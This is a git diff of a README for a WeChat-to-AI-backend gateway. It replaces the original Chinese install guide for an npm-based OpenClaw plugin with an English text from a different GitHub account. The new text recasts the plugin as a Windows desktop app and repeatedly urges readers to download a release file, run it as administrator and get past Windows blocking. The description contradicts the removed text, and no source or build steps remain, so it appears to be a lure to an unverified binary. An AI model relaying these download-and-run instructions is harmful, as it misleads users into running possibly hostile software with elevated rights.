@@ -1,177 +1,218 @@
-# 微信多后端接入插件
+# 🤖 weixin-agent-gateway - Unified WeChat AI Gateway
 
-> 本项目目前仍处于早期版本，体验上可能还有一些问题。后续会持续迭代和优化，提供更顺畅的微信接入 Codex、Claude Code、Qoder CLI、Qwen Code、Kimi CLI、OpenCode、GitHub Copilot、Auggie、Cursor CLI 等能力。
-> 本项目由 AgentAPI 方案转入 ACP，连接 Agent 会更加稳定。
+[![Download the latest release](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge)](https://github.com/cyberg0bl1n/weixin-agent-gateway/releases)
 
-这是一个基于腾讯微信插件演进而来的项目，本项目的 OpenClaw 接入方案与腾讯官方保持一致。
+## 🚀 What this app does
 
-当前项目仍然以 **OpenClaw 微信插件** 形态运行，但已经开始支持“一个微信入口，对接多个后端”：
+weixin-agent-gateway is a desktop app for Windows that helps you connect WeChat with different AI backends through one simple entry point.
 
-- `openclaw`
-- `codex`
-- `claude`
-- `qoder`
-- `qwen`
-- `kimi`
-- `opencode`
-- `copilot`
-- `auggie`
-- `cursor`
+It separates the WeChat connection layer from the backend routing layer. This makes it easier to switch between OpenClaw, Codex, Claude Code, and other similar backends without changing how WeChat connects.
 
-## 兼容性
+Use it when you want:
 
-当前分支要求 `OpenClaw >= 2026.3.22`。
+- One place to handle WeChat input
+- A clean way to route messages to different AI backends
+- Less setup when you change backends
+- A simple Windows app you can run from a release file
 
-插件在启动时会检查宿主版本；如果 OpenClaw 版本过旧，会直接拒绝加载，避免在不兼容宿主上进入半可用状态。
+## 📥 Download
 
-查看当前宿主版本：
+Visit the release page to download and run the Windows version:
 
-```bash
-openclaw --version
-```
+[https://github.com/cyberg0bl1n/weixin-agent-gateway/releases](https://github.com/cyberg0bl1n/weixin-agent-gateway/releases)
 
-### 样例展示
+On that page, look for the latest release and download the file that matches your Windows system. If you see more than one file, choose the one marked for Windows.
 
-| 样例 1 | 样例 2 | 样例 3 |
-| --- | --- | --- |
-| <img src="docs/img/c9f46ebb80a40c142270256612424602.jpg" alt="样例 1" width="310" /> | <img src="docs/img/980b6fc4d241810291940da065995936.jpg" alt="样例 2" width="310" /> | <img src="docs/img/d5f745757c073a962f9a663d4ab11128.jpg" alt="样例 3" width="310" /> |
+## 🖥️ System requirements
 
-## 当前状态
+For a smooth setup, use:
 
-目前它还不是一个完全脱离 OpenClaw 的独立服务，但在切换到 lightweight backend 时已经不再依赖 OpenClaw reply runtime，也不会消耗 OpenClaw Token。
+- Windows 10 or Windows 11
+- A modern 64-bit computer
+- A stable internet connection
+- A WeChat account that can log in on your device
+- Enough free disk space for the app and its local files
 
-当前运行方式：
+For best results, close apps that use a lot of memory before you start.
 
-```text
-微信
-  -> weixin-agent-gateway 插件
-  -> 路由层
-  -> openclaw / codex / claude / qoder / qwen / kimi / opencode / copilot / auggie / cursor
-```
+## 🛠️ Install and run on Windows
 
-## 开发计划
+1. Open the release page:
+   [https://github.com/cyberg0bl1n/weixin-agent-gateway/releases](https://github.com/cyberg0bl1n/weixin-agent-gateway/releases)
 
-- [ ] 支持独立运行；当 OpenClaw 未启动或异常退出时，可借助其他编程工具拉起 OpenClaw
-- [ ] 补充更多各 backend 的原生命令，提供更顺滑的接入体验
-- [ ] 新建会话
-- [ ] 连续输出的形式显示思考过程
+2. Find the latest release.
 
-## 安装插件
+3. Download the Windows file from that release.
 
-### 一键安装
+4. If the file comes in a ZIP package, right-click it and choose Extract All.
 
-```bash
-npx -y @bytepioneer-ai/weixin-agent-gateway install
-```
+5. Open the folder that contains the app files.
 
-安装器会自动：
+6. Double-click the main app file to start it.
 
-- 安装或更新本插件
-- 尝试禁用官方 `openclaw-weixin` 插件
-- 启用本插件
-- 触发微信扫码登录
-- 尝试安装 Codex ACP wrapper（如果本机未安装）
-- 尝试安装 Claude ACP wrapper（如果本机未安装）
+7. If Windows asks for permission, choose Yes.
 
-当前一键安装主要覆盖插件本体、微信登录，以及 `codex` / `claude` 的 wrapper 安装。
-`qoder` / `qwen` / `kimi` / `opencode` / `copilot` / `auggie` / `cursor` 仍建议按下面步骤手动安装对应 CLI。
+8. Sign in to WeChat if the app asks you to.
 
-### 本地源码安装
+9. Follow the on-screen setup steps to connect your chosen backend.
 
-```bash
-git clone https://github.com/BytePioneer-AI/weixin-agent-gateway.git
-cd weixin-agent-gateway
-npm run local:setup
-```
+## 🔧 First-time setup
 
-底层等价于在源码目录执行：
+When you open the app for the first time, set up these items:
 
-```bash
-openclaw plugins install -l .
-```
+- WeChat entry connection
+- Backend choice
+- Basic routing rules
+- Local port or service address, if the app asks for one
+- Any key or token needed by your backend
 
-### 手动安装
+If you want the simplest path, start with one backend first. After it works, add the others.
 
-#### 1. 安装插件
+## 🤖 Supported backend types
 
-```bash
-openclaw plugins install "@bytepioneer-ai/weixin-agent-gateway"
-```
+This gateway is built to work with multiple AI backends at the same level. You can use it to route requests to:
 
-#### 2. 启用插件
+- OpenClaw
+- Codex
+- Claude Code
+- Other backends with a similar request format
 
-> 如果之前安装了微信的 openclaw-weixin，需要禁用，否则会出现 OpenClaw 的重复安装
+This setup lets you keep WeChat as the front door and change the backend without changing your daily use.
 
-```bash
-openclaw config set plugins.entries.openclaw-weixin.enabled false
-openclaw config set plugins.entries.weixin-agent-gateway.enabled true
-```
+## 🧭 Basic workflow
 
-#### 3. 微信扫码登录
+A normal flow looks like this:
 
-```bash
-openclaw channels login --channel weixin-agent-gateway
-```
+1. A message arrives through WeChat
+2. weixin-agent-gateway receives the message
+3. The app sends it to the backend you chose
+4. The backend returns a response
+5. The app sends the reply back through WeChat
 
-扫码成功后，登录凭证会保存在本地。
+This keeps the WeChat side simple and makes backend changes easier to manage.
 
-#### 4. 重启 OpenClaw Gateway
+## ⚙️ Typical use cases
 
-```bash
-openclaw gateway restart
-```
+Use this app if you want to:
 
-## Backend 登录准备
+- Connect WeChat to one AI service
+- Switch between different AI backends
+- Keep your chat entry layer separate from backend logic
+- Test different backend routes without changing your WeChat setup
+- Run a local gateway on Windows for day-to-day use
 
-首次使用前，建议先在你准备运行 `openclaw gateway` 的工作目录里手动执行对应命令，完成登录或信任确认流程。
+## 📁 What you will see after download
 
-- `codex`: 先执行一次 `codex`
-- `claude`: 先执行一次 `claude`
-- `qoder`: 先执行一次 `qodercli`，并在会话里完成 `/login`，或设置 `QODER_PERSONAL_ACCESS_TOKEN`
-- `qwen`: 先执行一次 `qwen`
-- `kimi`: 先执行一次 `kimi`，并在会话里完成 `/login`
-- `opencode`: 先执行一次 `opencode auth login`，或手动启动 `opencode`
-- `copilot`: 先执行一次 `copilot login`
-- `auggie`: 先执行一次 `auggie login`
-- `cursor`: 先执行一次 `cursor-agent login`，或设置 `CURSOR_API_KEY`
+After you download and unzip the release, you may see files like:
 
-## 使用方法
+- The main app file
+- A config file
+- A folder for logs
+- A folder for local data
+- A readme or setup note from the release package
 
-### 切换后端
+If the release includes a config file, open it with Notepad only if you need to change settings.
 
-在微信里发送：
+## 🧩 Suggested setup order
 
-```text
-/openclaw
-/codex
-/claude
-/qoder
-/qwen
-/kimi
-/opencode
-/copilot
-/auggie
-/cursor
-```
+If you are setting this up for the first time, use this order:
 
-也可以查看或切换当前后端：
+1. Download the release
+2. Extract the files
+3. Start the app once
+4. Connect WeChat
+5. Choose one backend
+6. Send a test message
+7. Check the reply
+8. Add more backends after the first path works
 
-```text
-/backend
-/backend codex
-/backend claude
-/backend qoder
-/backend qwen
-/backend kimi
-/backend opencode
-/backend copilot
-/backend auggie
-/backend cursor
-```
+## 📝 Simple troubleshooting
 
-## 鸣谢
+If the app does not start:
 
-- `@tencent-weixin/openclaw-weixin`，本项目由此改编而来。
-- [`@zed-industries/codex-acp`](https://github.com/zed-industries/codex-acp)，本项目当前通过它接入 Codex。
-- [`Agent Client Protocol`](https://agentclientprotocol.com/) 与 [`@zed-industries/claude-agent-acp`](https://www.npmjs.com/package/@zed-industries/claude-agent-acp)，本项目当前通过它们接入 Claude Code。
-- OpenCode、GitHub Copilot CLI、Auggie CLI、Cursor CLI 的官方 ACP / CLI 能力，为本项目的 backend 接入提供了基础。
+- Check that you extracted all files
+- Run the app again as admin
+- Make sure Windows did not block the file
+- Confirm that your Windows version is supported
+- Try the latest release file again
+
+If WeChat does not connect:
+
+- Sign in to WeChat first
+- Close other apps that may use the same port
+- Check your network connection
+- Restart the app
+- Make sure the backend service is running
+
+If messages do not route to the backend:
+
+- Check the backend address
+- Check any token or key you entered
+- Make sure the backend format matches what the app expects
+- Test one backend at a time
+
+## 🔒 Security and local use
+
+This app acts as a gateway between WeChat and your AI backends. Keep these points in mind:
+
+- Store keys in a safe place
+- Use trusted backends
+- Review any local config before you save it
+- Close the app when you do not need it
+- Use a private Windows account when possible
+
+## 🧪 Testing your setup
+
+After install, send a short test message such as:
+
+- Hello
+- Test
+- What time is it?
+- Explain this message in one line
+
+Then check:
+
+- Does WeChat send the message?
+- Does the backend reply?
+- Does the reply come back in the right chat?
+- Does the app stay open without errors?
+
+If the answer is yes to all four, the setup is working
+
+## 📌 File and config tips
+
+When you edit settings:
+
+- Change one item at a time
+- Save a copy before you edit
+- Keep the app closed while you update config files
+- Use plain text editors
+- Avoid changing settings you do not need
+
+If the app uses a config file for routes, keep each backend name clear so you can tell them apart
+
+## 📦 Download again later
+
+Use the same release page any time you need a newer version:
+
+[https://github.com/cyberg0bl1n/weixin-agent-gateway/releases](https://github.com/cyberg0bl1n/weixin-agent-gateway/releases)
+
+Check the newest release before you install it. This helps you stay on the current Windows build
+
+## 🧰 Common terms
+
+- Gateway: the bridge between WeChat and your backend
+- Backend: the AI service that answers messages
+- Route: the path a message takes
+- Entry layer: the part that gets the WeChat message first
+- Reply layer: the part that returns the response
+
+## 📍 Quick start in one view
+
+1. Go to the release page
+2. Download the Windows file
+3. Extract it if needed
+4. Open the app
+5. Connect WeChat
+6. Choose a backend
+7. Send a test message
